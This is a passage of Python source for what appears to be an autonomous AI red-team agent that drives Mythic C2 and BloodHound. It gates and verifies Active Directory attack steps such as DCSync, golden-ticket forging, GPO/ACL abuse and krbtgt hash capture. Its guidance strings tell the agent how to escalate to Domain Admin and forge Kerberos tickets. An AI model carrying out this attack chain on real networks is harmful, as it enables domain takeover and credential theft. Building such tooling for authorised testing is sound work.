                "built with the deterministic capability builder (`build_capability_commands` for "
                "`forge-golden-ticket` or `ensure-kerberos-context`) and issued exactly as the "
                "builder-emitted Kerberos forge command. "
                "Do not handcraft Rubeus, Mimikatz, execute_assembly, or raw split forms; they caused "
                "false-achieved ledger entries, argument-splitting churn, and current-session ticket misuse. "
                "Ticket use must go through the builder's isolated logon-context/ticket-store sequence, not "
                "tool-level pass-the-ticket arguments. "
                "Issue the exact command object returned by `build_capability_commands`; changing SID/key/"
                "domain fields invalidates the deterministic builder proof."
            )
        ticket_context = (
            getattr(self, "_deterministic_ticket_command_contexts", {}).get(ticket_key, {})
            if ticket_key else {}
        )
        if (
            technique in {"golden-ticket", "sid-history-escalation"}
            and str(ticket_context.get("capability") or "").casefold() == "ensure-kerberos-context"
        ):
            self._pending_engagement_hop = None
            return None

        # Lazily refresh graph facts (TTL-bounded; retries while the cache is empty) so an async-completed
        # ingest is picked up on a later gate call — without it the chain never sees the graph if ingest
        # reported "pending" (the 2026-06-09 false-negative).
        try:
            await self._refresh_graph_facts_if_stale(now)
        except Exception:
            pass
        # Read-only artifact probe for durable-hop re-verification: corroborate "is the result still present?"
        # from the credential store + cached graph (so a durable hop is SKIPped if its artifact exists, and
        # re-run ONLY if a probed artifact is genuinely gone — never re-run merely to verify).
        try:
            corroboration = await self._corroboration_facts(now)
        except Exception:
            corroboration = []
        state = engagement_state.EngagementState(
            objective=self._engagement_objective(),
            footholds=footholds,
            hops=list(self._engagement_hops),
            graph_facts=corroboration,
            probed_effect_prefixes={"creds", "krbtgt-hash"},  # the cred-store probe definitively read these
            engagement_id=self._eng_key(),
            runtime_scope=True,
        )
        dom = self._dcsync_target_domain(technique, target_key)
        rights_missing = (
            technique in {"dcsync", "dcsync-user"}
            and bool(dom)
            and f"ds-replication-rights:{dom}" not in state.satisfied_predicates()
            # A cross-domain forge that has imported an EA-capable Kerberos context holds DS-Replication on the
            # parent via Enterprise Admins; do not pre-block its own proof DCSync as "no rights".
            and dom not in self._cross_domain_replication_rights
        )
        reason = f"missing precondition(s): ds-replication-rights:{dom}" if rights_missing else ""
        if self._should_block_premature_dcsync(
            technique, reason, bool(self._engagement_graph_facts),
            self._dcsync_precheck_blocks.get((technique, dom), 0), self._DCSYNC_PRECHECK_MAX_BLOCKS,
        ):
            self._dcsync_precheck_blocks[(technique, dom)] = \
                self._dcsync_precheck_blocks.get((technique, dom), 0) + 1
            self._pending_engagement_hop = None
            logger.info("🧭 [engagement-precheck] DCSync rights BLOCK %d/%d for %s",
                        self._dcsync_precheck_blocks[(technique, dom)],
                        self._DCSYNC_PRECHECK_MAX_BLOCKS, dom)
            return self._dcsync_rights_guidance(dom)

        self._pending_engagement_hop = (technique, target_key, now)
        return None

    _DCSYNC_PRECHECK_MAX_BLOCKS = 2

    @staticmethod
    def _dcsync_target_domain(technique: str, target_key: str) -> str:
        """The domain a DCSync hop targets: the bare domain for `dcsync`, the realm half for
        `dcsync-user` (`user@domain`)."""
        tk = str(target_key or "")
        return tk.split("@")[-1] if technique == "dcsync-user" else tk

    @staticmethod
    def _should_block_premature_dcsync(technique, reason, graph_populated, prior_blocks, max_blocks) -> bool:
        """Pure: block a proposed DCSync with rights-guidance? True ONLY for a dcsync technique whose gate
        DEFER cites missing replication rights, AND only when the graph is POPULATED (so absence is real
        evidence, not ignorance), AND only until the per-domain cap. Never blocks on an empty/unknown graph
        and never past the cap — so it cannot become a permanent deadlock."""
        return bool(
            technique in ("dcsync", "dcsync-user")
            and graph_populated
            and "ds-replication-rights" in (reason or "")
            and prior_blocks < max_blocks
        )

    @staticmethod
    def _dcsync_rights_guidance(dom: str) -> str:
        """Constructive, unambiguous block message for a premature DCSync — frames it as a RIGHTS problem
        (not command syntax, the 2026-06-09 misread) and names the corrective path."""
        return (
            f"[engagement-precheck] DCSync of {dom} not attempted: per the BloodHound graph and the "
            f"credentials you currently hold, NO principal you control has DS-Replication rights on {dom}, "
            f"so this DCSync would fail with 8453 (DS_DRA_ACCESS_DENIED). This is a RIGHTS problem, NOT a "
            f"command-syntax problem — do NOT permute the command or flags. First OBTAIN replication rights "
            f"on {dom} (gain Domain Admin via your controlled GPO/ACL path, or have a controlled principal "
            f"granted GetChanges + GetChangesAll), then re-collect or read the ACL to CONFIRM the edge "
            f"exists, THEN DCSync. (Empirical check: fires only while the graph shows the right absent; it "
            f"stops blocking once you hold the right or after a couple of attempts.)"
        )

    def _engagement_objective(self) -> str:
        if SAGE_ENGAGEMENT_OBJECTIVE:
            return SAGE_ENGAGEMENT_OBJECTIVE
        objective = self._refresh_engagement_objective_from_ledger()
        # An autonomous solve's prompt IS the mission, so adopt it as the engagement objective — otherwise
        # the only thing here is the opaque `sage-engagement:<task>` fallback, which
        # `engagement_state._objective_is_complete` deliberately never completes, so the solve can never
        # RECOGNIZE the objective and over-reaches until the stall detector halts it. Generic to ANY
        # autonomous_solve caller (operator, eval harness, production). Precedence: the env wins (above); an
        # operator `state objective ...` or a legacy/provenance-less ledger objective is STICKY and wins here;
        # a new autonomous seed supersedes ONLY a prior autonomous_seed objective (so a reused client running
        # a fresh solve adopts its own mission instead of bleeding the previous one). The seed is returned
        # in-memory every call (never cached into _engagement_objective_text, so it can't masquerade as a
        # durable read) and persisted to the ledger exactly once, after the operation key resolves.
        seed = self._human_engagement_objective(getattr(self, "_autonomous_objective_seed", ""))
        supersedes = bool(seed and seed != objective and self._engagement_objective_source == "autonomous_seed")
        if objective and not supersedes:
            return objective
        if seed:
            if not self._autonomous_objective_persisted and self._engagement_key is not None:
                self._persist_autonomous_objective_seed(seed)
            return seed
        return f"sage-engagement:{self.agent_task_id}" if self.agent_task_id else "sage-engagement"

    def _persist_autonomous_objective_seed(self, text: str) -> None:
        """Write an adopted autonomous objective to the durable ledger ONCE, under the now-resolved key.
        Re-reads the ledger immediately before writing and NEVER overwrites an operator-set or legacy
        (provenance-less) objective — only an absent or prior autonomous_seed objective is (re)written —
        matching state.py's own load→set-objective→save pattern. Stamps objective_source='autonomous_seed'.
        Latches on success so it runs at most once per seed; a transient I/O error leaves the latch unset so
        the next call retries. Fail-open: never breaks the solve."""
        try:
            try:
                from . import engagement_ledger
            except ImportError:
                import engagement_ledger
            key = self._eng_key()
            data = engagement_ledger.load_runtime(key)
            existing = self._human_engagement_objective(data.get("objective"))
            existing_source = str(data.get("objective_source") or "")
            # Operator/legacy objective on disk -> never clobber. None or prior autonomous_seed -> (re)write.
            if not existing or existing_source == "autonomous_seed":
                data["objective"] = text
                data["objective_source"] = "autonomous_seed"
                data["updated"] = datetime.now(timezone.utc).isoformat()
                engagement_ledger.save_runtime(data, key)
                self._engagement_objective_text = text
                self._engagement_objective_source = "autonomous_seed"
            self._autonomous_objective_persisted = True
        except Exception:
            pass

    @staticmethod
    def _human_engagement_objective(value) -> str:
        text = str(value or "").strip()
        if not text:
            return ""
        lowered = text.casefold()
        if lowered == "sage-engagement" or lowered.startswith("sage-engagement:"):
            return ""
        return text

    def _refresh_engagement_objective_from_ledger(self) -> str:
        """Return the human/operator objective from the active ledger, if one exists.

        The operator-facing `state objective ...` command edits the same durable ledger while Sage may
        already be running. Refreshing here prevents later write-throughs from replacing that objective with
        the fallback `sage-engagement:<task>` identifier.
        """
        try:
            path = self._engagement_ledger_path()
            if os.path.exists(path):
                with open(path, "r", encoding="utf-8") as fh:
                    payload = json.load(fh)
                if isinstance(payload, dict):
                    objective = self._human_engagement_objective(payload.get("objective"))
                    if objective:
                        self._engagement_objective_text = objective
                        # INVARIANT: the source mirror is set only alongside a non-empty objective, and the
                        # only consumer (the supersede check in _engagement_objective) is itself gated behind a
                        # non-empty objective — so a stale mirror is never read. Preserve that gating if you
                        # add a new consumer, else this becomes a live stale-read window.
                        self._engagement_objective_source = str(payload.get("objective_source") or "")
        except Exception:
            pass
        return self._engagement_objective_text

    _CRED_CACHE_TTL_SECONDS = 60

    @staticmethod
    def _credential_task_terminal_success_status(task: dict | None) -> str:
        """Return an admissible terminal-success label for a credential's source task, else empty."""
        task = task if isinstance(task, dict) else {}
        status = str(task.get("status") or "").strip().casefold()
        if any(marker in status for marker in ("error", "fail", "cancel")):
            return ""
        if status in {"completed", "complete", "success", "succeeded"}:
            return status
        if task.get("completed") is True:
            return "completed"
        return ""

    def _credential_store_proof_envelope(self, credential: dict, now: str) -> dict:
        """Build proof for a Mythic credential row only when its source task lineage is complete."""
        if not isinstance(credential, dict):
            return {}
        task = credential.get("task") if isinstance(credential.get("task"), dict) else {}
        callback = task.get("callback") if isinstance(task.get("callback"), dict) else {}
        return self._runtime_credential_proof_envelope(
            "mythic_credential_store:observed",
            now,
            credential_id=credential.get("id"),
            callback_id=callback.get("display_id") or callback.get("id"),
            task_id=task.get("display_id") or task.get("id"),
            terminal_status=self._credential_task_terminal_success_status(task),
            command=str(task.get("command_name") or task.get("command") or ""),
            metadata={"credential_type": str(credential.get("type") or "")},
        )

    async def _fetch_credentials_cached(self, now: str) -> list:
        """Read the Mythic credential store (read-only) with a short-TTL cache, shared by read_credentials
        and the gate's corroboration probe so neither re-queries Mythic repeatedly. Returns raw cred rows.
        Fail-open -> last cache or []."""
        try:
            try:
                from . import engagement_state, operation_context
            except ImportError:
                import engagement_state
                import operation_context
            if self._cred_cache is not None and self._cred_cache_ts:
                last = engagement_state._parse_iso(self._cred_cache_ts)
                cur = engagement_state._parse_iso(now)
                if last is not None and cur is not None and (cur - last).total_seconds() < self._CRED_CACHE_TTL_SECONDS:
                    return self._cred_cache
            if self.client is None:
                return self._cred_cache or []
            op_id = None
            try:
                resolved = await operation_context.resolve_operation(self.client)
                op_id = resolved[0] if resolved else None
            except Exception:
                op_id = None
            if op_id is not None:
                query = ("query SageReadCredentials($op: Int) { credential(where: {deleted: {_eq: false}, "
                         "operation_id: {_eq: $op}}, order_by: {id: desc}, limit: 200) "
                         "{ id account realm type credential_text comment timestamp "
                         "task { display_id status completed command_name callback { display_id } } } }")
                variables = {"op": op_id}
            else:
                query = ("query SageReadCredentials { credential(where: {deleted: {_eq: false}}, "
                         "order_by: {id: desc}, limit: 200) { id account realm type credential_text comment timestamp "
                         "task { display_id status completed command_name callback { display_id } } } }")
                variables = None
            resp = await mythic.execute_custom_query(self.client, query, variables=variables)
            creds = (resp or {}).get("credential") or []
            self._cred_cache = creds
            self._cred_cache_ts = now
            return creds
        except Exception:
            return self._cred_cache or []

    async def _corroboration_facts(self, now: str) -> list:
        """Read-only ARTIFACT PROBE for durable-hop re-verification: turn the credential store + the cached
        graph ACLs into corroboration predicates so the gate SKIPs a durable hop whose result is STILL
        PRESENT instead of re-running the attack. Emits ONLY positive predicates (creds:, krbtgt-hash:,
        ds-replication-rights:, system:{gpo}) — never generic-write:/write-dacl:, so it can't newly enforce a
        graph precondition (no DEFER regression). Fail-open -> []."""
        try:
            from . import engagement_state
        except ImportError:
            import engagement_state
        facts_by_predicate: dict[str, object] = {}

        def add(pred: str, *, proof_envelope: dict | None = None) -> None:
            p = engagement_state._normalize_predicate(pred)
            if not p:
                return
            proof = dict(proof_envelope) if isinstance(proof_envelope, dict) else {}
            existing = facts_by_predicate.get(p)
            if existing is not None and (
                getattr(existing, "proof_envelope", {}) or not proof
            ):
                return
            facts_by_predicate[p] = engagement_state.GraphFact(
                predicate=p,
                source="live-probe",
                timestamp=now,
                ttl_seconds=self._GRAPH_FACTS_TTL_SECONDS,
                proof_envelope=proof,
            )

        # 1. Credential store -> creds:{account@realm}, krbtgt-hash:{realm} (the dcsync/lsass artifacts).
        try:
            for c in await self._fetch_credentials_cached(now):
                acct = self._canonical_credential_account(c.get("account"))
                realm = str(c.get("realm") or "").strip().casefold()
                if not str(c.get("credential_text") or "").strip():
                    continue
                credential_proof = self._credential_store_proof_envelope(c, now)
                if acct and realm:
                    add(f"creds:{acct}@{realm}", proof_envelope=credential_proof)
                if acct == "krbtgt" and realm:
                    add(f"krbtgt-hash:{realm}", proof_envelope=credential_proof)
        except Exception:
            pass
        # 2. Cached graph ACLs -> gpo-abuse corroboration (you still CONTROL the GPO) + replication passthrough.
        try:
            for gf in (getattr(self, "_engagement_graph_facts", []) or []):
                p = engagement_state._normalize_predicate(getattr(gf, "predicate", ""))
                graph_proof = dict(getattr(gf, "proof_envelope", {}) or {})
                if p.startswith("generic-write:gpo:"):
                    add("system:" + p[len("generic-write:gpo:"):], proof_envelope=graph_proof)
                elif p.startswith("ds-replication-rights:"):
                    add(p, proof_envelope=graph_proof)
                elif p.startswith("gpo-domain:"):
                    # Pass the GPO->domain link through so the gate's _expand_implications can chain
                    # gpo-abuse (system:{gpo}) -> ds-replication-rights:{domain} -> dcsync. Without it the
                    # planner names dcsync but the gate DEFERs it (missing ds-replication-rights) -> churn.
                    add(p, proof_envelope=graph_proof)
        except Exception:
            pass
        return list(facts_by_predicate.values())

    _GRAPH_FACTS_TTL_SECONDS = 600                 # facts stay live in the engagement state for 10 min
    _GRAPH_FACTS_REFRESH_INTERVAL_SECONDS = 120    # don't re-run the read-only cypher more than ~every 2 min

    async def _refresh_graph_facts_if_stale(
        self,
        now: str,
        force: bool = False,
        proof_envelope: dict | None = None,
    ) -> None:
        """Refresh the cached BloodHound graph facts (ACL edges → engagement predicates) that feed the
        forward planner / per-turn injection. TTL-bounded (the read-only cypher runs at most ~every 2 min
        unless forced — e.g. right after a verified ingest). SUGGESTION-ONLY: these are NOT fed into the
        gate's enforcement state, so this can never newly DEFER a real hop. Best-effort, fail-open."""
        # A forced refresh follows a verified ingest (topology may have changed — e.g. a parent domain's DC
        # just became visible). Invalidate the per-domain DC + domain-SID caches so a stale pre-collection
        # result (e.g. a child DC cached for a parent domain, or a pre-rebuild SID) is never served (Forge #2/#5).
        if force:
            self._domain_controller_cache = {}
            self._domain_sid_cache = {}
        proof_envelope = (
            dict(proof_envelope)
            if isinstance(proof_envelope, dict)
            else dict(getattr(self, "_last_bloodhound_ingest_proof_envelope", {}) or {})
        )
        try:
            try:
                from . import access_reconciler, engagement_state, graph_reconciler
            except ImportError:
                import access_reconciler
                import engagement_state
                import graph_reconciler

            # Need footholds to derive the controlled principals the cypher matches on. Use the gate's
            # cache if present; otherwise reconcile once (collection tools aren't classified, so the cache
            # may be empty right after the first ingest — before any attack hop has run through the gate).
            footholds = list(getattr(self, "_engagement_footholds", []) or [])
            if not footholds:
                try:
                    footholds = await access_reconciler.reconcile_access(self, now)
                    self._engagement_footholds = list(footholds)
                except Exception:
                    footholds = []

            state = engagement_state.EngagementState(
                objective=self._engagement_objective(),
                footholds=footholds,
                hops=list(self._engagement_hops),
                graph_facts=list(getattr(self, "_engagement_graph_facts", []) or []),
                engagement_id=self._eng_key(),
                runtime_scope=True,
            )
            principals = graph_reconciler.controlled_principals_from_state(state)
            credential_domains = graph_reconciler.credential_target_domains_from_state(state)
            if not principals and not credential_domains:
                logger.info(
                    f"🧭 [graph-facts] refresh skipped: 0 controlled principals/domains "
                    f"(footholds={len(footholds)}, alive={sum(1 for f in footholds if getattr(f, 'alive', False))})"
                )
                return

            # Only TTL-skip when we ALREADY HAVE facts and those facts cover the current control horizon.
            # A new DA/kerberos-context can unlock DCSync over a domain after the last graph refresh; in that
            # case we must query again immediately so BloodHound can surface useful real-user targets.
            missing_domain_targets = _graph_facts_missing_credential_domains(
                getattr(self, "_engagement_graph_facts", []) or [],
                credential_domains,
            )
            if not force and self._engagement_graph_facts and self._engagement_graph_facts_ts and not missing_domain_targets:
                last = engagement_state._parse_iso(self._engagement_graph_facts_ts)
                cur = engagement_state._parse_iso(now)
                if last is not None and cur is not None:
                    if (cur - last).total_seconds() < self._GRAPH_FACTS_REFRESH_INTERVAL_SECONDS:
                        return

            # Resolve the BloodHound MCP cypher_query tool (mirror ingest_collection's resolution).
            cypher_tool = None
            try:
                from ai.mcp import MCPManager
                for server in MCPManager.get_connected_servers():
                    if not MCPManager.is_bloodhound_server(server):
                        continue
                    for tool in MCPManager.get_tools_by_server(server):
                        if getattr(tool, "name", "") == "cypher_query":
                            cypher_tool = tool
            except Exception:
                cypher_tool = None
            if cypher_tool is None:
                logger.info("🧭 [graph-facts] refresh skipped: BloodHound cypher_query tool not resolvable")
                return

            class _SingleToolMCP:
                """Adapter: graph_reconciler.reconcile_graph_position expects a get_tool_by_name(name)
                accessor; the live MCPManager exposes get_tools_by_server instead. We already resolved the
                cypher tool, so hand it back directly."""

                def __init__(self, tool):
                    self._tool = tool

                async def get_tool_by_name(self, name, server_name=None):
                    del name, server_name
                    return self._tool

            reconciled_facts = list(await graph_reconciler.reconcile_graph_position(
                _SingleToolMCP(cypher_tool), principals, state.objective, now,
                self._GRAPH_FACTS_TTL_SECONDS,
                credential_domains=credential_domains,
                proof_envelope=proof_envelope,
            ) or [])
            facts = list(reconciled_facts)
            if reconciled_facts:
                covered_domains = await _bloodhound_collected_domains()
                existing_predicates = {
                    engagement_state._normalize_predicate(getattr(fact, "predicate", ""))
                    for fact in facts
                }
                for domain in covered_domains:
                    predicate = engagement_state._normalize_predicate(f"domain-collected:{domain}")
                    if predicate and predicate not in existing_predicates:
                        existing_predicates.add(predicate)
                        facts.append(engagement_state.GraphFact(
                            predicate=predicate,
                            source="bloodhound:domain_info",
                            timestamp=now,
                            ttl_seconds=self._GRAPH_FACTS_TTL_SECONDS,
                            proof_envelope=dict(proof_envelope),
                        ))
            # Non-clobbering: a pending/empty reconcile (graph not ingested yet) must NOT wipe good facts
            # from a prior refresh. Only overwrite when this reconcile actually returned edges.
            if reconciled_facts:
                self._engagement_graph_facts = facts
                self._engagement_graph_facts_ts = now
                try:
                    self._persist_engagement_ledger()
                except Exception:
                    pass
            logger.info(
                f"🧭 [graph-facts] refresh: principals={len(principals)} new_facts={len(facts)} "
                f"cached={len(self._engagement_graph_facts)} "
                f"preds={[getattr(f, 'predicate', '') for f in self._engagement_graph_facts][:6]}"
            )
        except Exception as exc:
            logger.info(f"🧭 [graph-facts] refresh error (fail-open): {exc}")
            # fail-open: planner suggestions are best-effort, never break the issue path

    def _queue_task_backed_transition(
        self,
        *,
        kind: str,
        key: str,
        callback_display_id: int | str,
    ) -> None:
        """Stage an operational transition that can be committed only after Mythic creates a real task."""
        self._pending_task_backed_transition = {
            "kind": str(kind or ""),
            "key": str(key or ""),
            "callback_id": str(callback_display_id or ""),
            "queued_at": datetime.now(timezone.utc).isoformat(),
        }

    def _commit_task_backed_transition(
        self,
        command: str,
        parameters,
        callback_display_id: int | str,
        task_display_id: int | str,
    ) -> None:
        """Convert a queued transition into task-backed transient state.

        The invariant is simple: classifier/gate decisions can stage intent, but operational state is committed
        only when Mythic returns a concrete task display_id for the command that will produce the effect.
        """
        pending = getattr(self, "_pending_task_backed_transition", None)
        self._pending_task_backed_transition = None
        if not pending:
            return
        if str(pending.get("callback_id") or "") != str(callback_display_id or ""):
            return
        key = str(pending.get("key") or "")
        if not key:
            return
        if str(pending.get("kind") or "") == "collect-graph":
            self._collection_in_flight[key] = {
                "kind": "collect-graph",
                "key": key,
                "task_id": str(task_display_id),
                "callback_id": str(callback_display_id),
                "command": str(command or ""),
                "parameters_preview": str(parameters)[:300],
                "created_at": datetime.now(timezone.utc).isoformat(),
            }
            self._mark_operator_collection_launched(key, task_display_id, callback_display_id, parameters)
            logger.info(
                "🧭 [task-backed-transition] collect-graph in-flight key=%s task=%s callback=%s",
                key,
                task_display_id,
                callback_display_id,
            )

    async def _collection_in_flight_blocker(self, access_key: str) -> str | None:
        """Return a collect-graph SKIP message only when the marker is backed by a real Mythic task.

        Stale/unbacked markers are invalidated and the caller should proceed to launch collection.
        """
        record = self._collection_in_flight.get(access_key)
        if not record:
            return None
        if not isinstance(record, dict):
            self._collection_in_flight.pop(access_key, None)
            return None
        task_id = str(record.get("task_id") or "").strip()
        callback_id = str(record.get("callback_id") or "").strip()
        if not task_id or not callback_id:
            self._collection_in_flight.pop(access_key, None)
            logger.info("🧭 [task-backed-transition] invalidated unbacked collect-graph marker key=%s", access_key)
            return None
        try:
            tasks = await mythic.get_all_tasks(mythic=self.client, callback_display_id=int(callback_id))
        except Exception:
            tasks = []
        task = next((t for t in tasks or [] if str(t.get("display_id")) == task_id), None)
        if task is None:
            self._collection_in_flight.pop(access_key, None)
            logger.info(
                "🧭 [task-backed-transition] invalidated collect-graph marker key=%s missing_task=%s",
                access_key,
                task_id,
            )
            return None
        status = str(task.get("status") or "").strip()
        completed = bool(task.get("completed"))
        status_cf = status.casefold()
        if completed and any(marker in status_cf for marker in ("error", "fail", "cancel")):
            self._collection_in_flight.pop(access_key, None)
            logger.info(
                "🧭 [task-backed-transition] invalidated failed collect-graph marker key=%s task=%s status=%s",
                access_key,
                task_id,
                status,
            )
            return None
        if completed:
            row = None
            artifact_known = False
            try:
                row = await self._latest_download_for_callback(int(callback_id), "zip")
                artifact_known = True
            except Exception:
                artifact_known = False
            if artifact_known and row is None:
                self._collection_in_flight.pop(access_key, None)
                logger.info(
                    "🧭 [task-backed-transition] invalidated completed-but-no-artifact collect-graph marker key=%s task=%s",
                    access_key,
                    task_id,
                )
                return None
            if artifact_known and row is not None:
                file_content = None
                artifact_fetched = False
                try:
                    file_content = await mythic.download_file(
                        mythic=self.client,
                        file_uuid=row["agent_file_id"],
                    )
                    artifact_fetched = True
                except Exception:
                    artifact_fetched = False
                if artifact_fetched and not (
                    file_content and _looks_like_bloodhound_collection_zip(file_content)
                ):
                    self._collection_in_flight.pop(access_key, None)
                    logger.info(
                        "🧭 [task-backed-transition] invalidated completed-but-no-artifact collect-graph marker key=%s task=%s",
                        access_key,
                        task_id,
                    )
                    return None
            return (
                "[engagement-gate] skipped: graph collection already launched and completed for this access "
                f"level ({access_key}) by Mythic task #{task_id} status={status!r}. Do NOT launch another "
                "collector. Inspect that task output, list the configured output directory, download the ZIP, "
                "and ingest it into BloodHound. If no artifact exists and the task output proves failure, report "
                "that failed task instead of trusting an unproven in-flight marker."
            )
        return (
            "[engagement-gate] skipped: graph collection is already in-flight for this access level "
            f"({access_key}) as Mythic task #{task_id} status={status!r}. Wait for that task or inspect task "
            "history/output; do NOT launch another SharpHound."
        )

    async def _record_graph_built(
        self,
        callback_display_id,
        verified: bool,
        covered_domains: list[str] | None = None,
        collection_scope_domain: str = "",
        proof_envelope: dict | None = None,
    ) -> None:
        """Record the collect-graph effect for the resolving callback auth-context plus requested scope.

        Default ``--SearchForest`` ingests keep the legacy access-only key. Targeted ``--Domain`` ingests append
        the scope domain so the same auth context can collect a trusted external domain exactly once without
        clobbering the current-forest collection record. Best-effort, fail-open."""
        try:
            proof_envelope = (
                dict(proof_envelope)
                if isinstance(proof_envelope, dict)
                else dict(getattr(self, "_last_bloodhound_ingest_proof_envelope", {}) or {})
            )
            if callback_display_id is None:
                return
            try:
                from . import access_reconciler, engagement_state
            except ImportError:
                import access_reconciler
                import engagement_state
            now = datetime.now(timezone.utc).isoformat()
            footholds = list(getattr(self, "_engagement_footholds", []) or [])
            if not footholds:
                try:
                    footholds = await access_reconciler.reconcile_access(self, now)
                    self._engagement_footholds = list(footholds)
                except Exception:
                    footholds = []
            fh = next(
                (f for f in footholds if str(getattr(f, "callback_id", "")) == str(callback_display_id)), None
            )
            if fh is None:
                return
            state = engagement_state.EngagementState(
                objective=self._engagement_objective(), footholds=footholds, hops=list(self._engagement_hops),
                engagement_id=self._eng_key(), runtime_scope=True,
            )
            collection_key = engagement_state.collection_target_key(state, fh, collection_scope_domain)
            if not collection_key:
                return
            self._collection_in_flight.pop(collection_key, None)
            if not verified:
                return
            visibility_context = _task_visibility_context.get() or {}
            policy_decision = (
                visibility_context.get("policy_decision")
                if isinstance(visibility_context.get("policy_decision"), dict)
                else {}
            )
            evidence = {
                "source": "ingest_collection",
                "provenance": "run",
                "graph_verified": True,
                "collection_scope_domain": str(collection_scope_domain or "").strip().casefold(),
                "covered_domains": sorted({
                    str(domain or "").strip().casefold()
                    for domain in covered_domains or []
                    if str(domain or "").strip()
                }),
            }
            evidence.update(_policy_decision_evidence(policy_decision))
            updated = engagement_state.record_hop_result(
                state, "collect-graph", collection_key, "achieved",
                evidence,
                now,
                proof_envelope=proof_envelope,
                require_admissible_proof=True,
                engagement_id=self._eng_key(),
            )
            self._engagement_hops = updated.hops
            try:
                self._persist_engagement_ledger()
            except Exception:
                pass
        except Exception:
            pass

    def _runtime_task_proof_envelope(
        self,
        verifier_id: str,
        now: str,
        *,
        callback_id=None,
        task_id=None,
        terminal_status: str = "",
        command: str = "",
        transaction_id: str = "",
        metadata: dict | None = None,
    ) -> dict:
        try:
            try:
                from . import proof_boundary
            except ImportError:
                import proof_boundary
            envelope = proof_boundary.make_runtime_task_envelope(
                engagement_id=self._eng_key(),
                callback_id=callback_id if callback_id is not None else getattr(self, "_last_issued_callback_id", None),
                task_id=task_id if task_id is not None else getattr(self, "_last_issued_task_display_id", None),
                terminal_status=terminal_status or getattr(self, "_last_issued_task_terminal_status", ""),
                command=command or getattr(self, "_last_issued_command", ""),
                verifier_id=verifier_id,
                captured_at=now,
                transaction_id=transaction_id or self._current_transaction_id(),
                metadata=metadata or {},
            )
            return envelope.to_dict()
        except Exception:
            return {}

    def _runtime_artifact_proof_envelope(
        self,
        verifier_id: str,
        now: str,
        *,
        artifact_id: str,
        artifact_sha256: str,
        callback_id=None,
        task_id=None,
        terminal_status: str = "",
        command: str = "",
        transaction_id: str = "",
        metadata: dict | None = None,
    ) -> dict:
        try:
            try:
                from . import proof_boundary
            except ImportError:
                import proof_boundary
            envelope = proof_boundary.make_runtime_artifact_envelope(
                engagement_id=self._eng_key(),
                callback_id=callback_id if callback_id is not None else getattr(self, "_last_issued_callback_id", None),
                task_id=task_id if task_id is not None else getattr(self, "_last_issued_task_display_id", None),
                terminal_status=terminal_status or getattr(self, "_last_issued_task_terminal_status", ""),
                command=command or getattr(self, "_last_issued_command", ""),
                artifact_id=artifact_id,
                artifact_sha256=artifact_sha256,
                verifier_id=verifier_id,
                captured_at=now,
                transaction_id=transaction_id or self._current_transaction_id(),
                metadata=metadata or {},
            )
            return envelope.to_dict()
        except Exception:
            return {}

    def _runtime_credential_proof_envelope(
        self,
        verifier_id: str,
        now: str,
        *,
        credential_id,
        callback_id=None,
        task_id=None,
        terminal_status: str = "",
        command: str = "",
        transaction_id: str = "",
        metadata: dict | None = None,
    ) -> dict:
        try:
            try:
                from . import proof_boundary
            except ImportError:
                import proof_boundary
            envelope = proof_boundary.make_runtime_credential_envelope(
                engagement_id=self._eng_key(),
                callback_id=callback_id,
                task_id=task_id,
                terminal_status=terminal_status,
                command=command,
                credential_id=credential_id,
                verifier_id=verifier_id,
                captured_at=now,
                transaction_id=transaction_id or self._current_transaction_id(),
                metadata=metadata or {},
            )
            admission = proof_boundary.admit_runtime_envelope(
                envelope,
                current_engagement_id=self._eng_key(),
            )
            return envelope.to_dict() if admission.admitted else {}
        except Exception:
            return {}

    def _runtime_bloodhound_proof_envelope(
        self,
        verifier_id: str,
        now: str,
        *,
        ingest_job_id,
        ingest_status: str,
        source_artifact_id: str,
        source_artifact_sha256: str,
        callback_id=None,
        task_id=None,
        terminal_status: str = "",
        command: str = "",
        transaction_id: str = "",
        metadata: dict | None = None,
    ) -> dict:
        try:
            try:
                from . import proof_boundary
            except ImportError:
                import proof_boundary
            envelope = proof_boundary.make_runtime_bloodhound_envelope(
                engagement_id=self._eng_key(),
                callback_id=callback_id if callback_id is not None else getattr(self, "_last_issued_callback_id", None),
                task_id=task_id if task_id is not None else getattr(self, "_last_issued_task_display_id", None),
                terminal_status=terminal_status or getattr(self, "_last_issued_task_terminal_status", ""),
                command=command or getattr(self, "_last_issued_command", ""),
                ingest_job_id=ingest_job_id,
                ingest_status=ingest_status,
                source_artifact_id=source_artifact_id,
                source_artifact_sha256=source_artifact_sha256,
                verifier_id=verifier_id,
                captured_at=now,
                transaction_id=transaction_id or self._current_transaction_id(),
                metadata=metadata or {},
            )
            return envelope.to_dict()
        except Exception:
            return {}

    def _current_transaction_id(self) -> str:
        context = _task_visibility_context.get() or {}
        if not isinstance(context, dict):
            return ""
        value = context.get("transaction_id")
        if value not in (None, ""):
            return self._capability_text(value)
        decision = context.get("policy_decision")
        if isinstance(decision, dict):
            return self._capability_text(decision.get("transaction_id"))
        return ""

    def _record_engagement_success(self, results_str) -> None:
        pending = self._pending_engagement_hop
        try:
            if pending is None:
                return
            try:
                from . import credential_artifacts, engagement_state
            except ImportError:
                import credential_artifacts
                import engagement_state
            technique, target_key, now = pending

            # Verify-on-record: high-value modeled effects record `achieved` only when the task output
            # contains the artifact that proves the effect. Mythic task success is transport status, not
            # effect proof.
            status = "achieved"
            extra: dict = {}
            if technique in credential_artifacts.CREDENTIAL_TECHNIQUES:
                probe = credential_artifacts.extract_credential_probe(results_str)
                verdict = engagement_state.verify_effect(technique, target_key, probe)
                status = "achieved" if verdict == "achieved" else "failed"
                extra = {
                    "verified_on_record": True,
                    "verify_verdict": verdict,
                    "artifact_present": bool(probe.get("credentials_dumped")),
                }
                if status != "achieved":
                    # Stickiness (do not regress durable resume): a no-key re-probe must NOT downgrade a
                    # prior VERIFIED achieved (real key in evidence). A legacy/false achieved (no real-key
                    # evidence) MAY still be overwritten — that is cleanup of the false-achieved bug.
                    if self._prior_verified_credential_hop(technique, target_key) is not None:
                        logger.info(
                            f"🔒 [verify-on-record] {technique} {target_key}: re-probe found no key, but a "
                            f"prior VERIFIED achieved (real key) exists — keeping it, not downgrading."
                        )
                        return
                    logger.warning(
                        f"🔒 [verify-on-record] {technique} {target_key}: NO usable key in task output "
                        f"(verdict={verdict}) — recording FAILED, not achieved (prevents placeholder forgery)."
                    )
            elif technique in credential_artifacts.GRANT_TECHNIQUES:
                # Verify-on-record for the DS-Replication rights grant (2026-06-09 false-achieved-grant bug):
